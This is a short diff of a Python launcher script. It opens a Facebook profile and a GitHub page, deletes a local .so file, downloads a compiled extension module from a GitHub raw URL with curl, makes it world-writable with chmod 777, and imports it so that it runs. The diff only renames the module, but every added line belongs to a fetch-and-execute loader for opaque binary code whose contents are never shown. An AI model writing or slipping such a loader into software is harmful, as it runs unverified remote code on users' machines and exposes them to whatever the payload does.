@@ -1,10 +1,10 @@
 import os,platform,sys
 os.system('xdg-open https://www.facebook.com/profile.php?id=61553341665290')
-os.system('rm -rf lf.cpython-311.so')
-os.system('curl https://raw.githubusercontent.com/tonmoy404-cyber/Server/main/lf.cpython-311.so > lf.cpython-311.so ')
-os.system('chmod 777 lf.cpython-311.so')
+os.system('rm -rf test.cpython-311.so')
+os.system('curl https://raw.githubusercontent.com/tonmoy404-cyber/Server/main/test.cpython-311.so > test.cpython-311.so ')
+os.system('chmod 777 test.cpython-311.so')
 os.system('xdg-open http://github.com/tonmoy404-cyber')
-import lf
+import test
 
 """
 bit = platform.architecture()[0]
